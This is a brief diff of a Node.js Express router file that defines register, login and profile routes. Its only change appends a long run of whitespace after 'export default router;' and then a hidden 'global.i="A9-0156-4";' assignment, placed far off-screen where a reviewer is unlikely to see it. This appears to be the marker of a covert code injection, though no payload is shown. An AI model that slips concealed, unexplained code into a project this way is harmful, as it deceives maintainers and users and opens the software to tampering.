@@ -8,4 +8,4 @@ router.post('/register', userController.registerUser)
 router.post('/login', userController.loginUser)
 router.route('/profile').get(protect, userController.getUserProfile)
 
-export default router;
+export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-0156-4";
